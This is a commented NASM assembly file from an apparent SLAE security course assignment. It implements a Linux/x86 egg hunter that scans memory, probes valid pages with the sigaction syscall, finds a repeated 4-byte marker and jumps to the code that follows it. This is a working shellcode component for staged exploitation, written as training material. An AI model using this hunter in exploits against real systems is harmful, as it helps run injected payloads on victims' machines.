; Student ID   : SLAE-1250
; Student Name : Jonathan "Chops" Crosby
; Assignment 3 : Egg Hunter (Linux/x86) Assembly
; File Name    : egg-hunter.nasm

global _start

section .text

_start:

setup_page:
	or  cx, 0xfff	; setting lower 16 bits to 4095

next_address:
	inc ecx		; moving it to 4096 while avoiding 
			; null characters 0x00

	xor eax, eax	; zeroing out eax
	mov al, 0x43	; interupt value for sigaction

	int 0x80	; call interupt to trigger sigaction

	cmp al, 0xf2	; eax will contain 0xf2 if memory
			; is not valid, ie. an EFAULT

	jz setup_page	; if the compare flag is zero then
			; we don't have valid memory so reset
			; to the next memory page and press on

	mov eax, 0xFCFCFCFC ; moving egg into eax in prep for searching

	mov edi, ecx	; moving address of valid memory into edi
			; in prep for calling scasd

	scasd		 ; comparing first four bytes of ecx with our egg

	jnz next_address ; if it dosent match increase memory by one byte
			 ; and try again
	
	scasd		; if we matched the first four then do we match
			; the next four bytes?  if so we found the egg!

	jnz next_address ; if this is not zero it's not a match
			 ; so on we will press increasing memory one more byte

	jmp edi		 ; if we got this far then we found our egg and our
			 ; memory address is already at the right place due
			 ; to scasd increasing by 4 bytes on each search
